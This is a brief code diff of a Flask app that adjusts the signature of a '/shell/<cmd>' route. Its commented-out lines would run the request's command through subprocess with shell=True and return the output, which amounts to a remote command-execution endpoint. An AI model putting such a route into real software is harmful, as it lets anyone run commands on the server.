@@ -73,7 +73,7 @@ def logout():
     return redirect(url_for('home'))
 
 @app.route("/shell/<cmd>")
-def shell():
+def shell(cmd):
     # p = subprocess.Popen(request.args.get('cmd'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     # stdout_data, stderr_data = p.communicate()
     # return commands.getoutput(s)
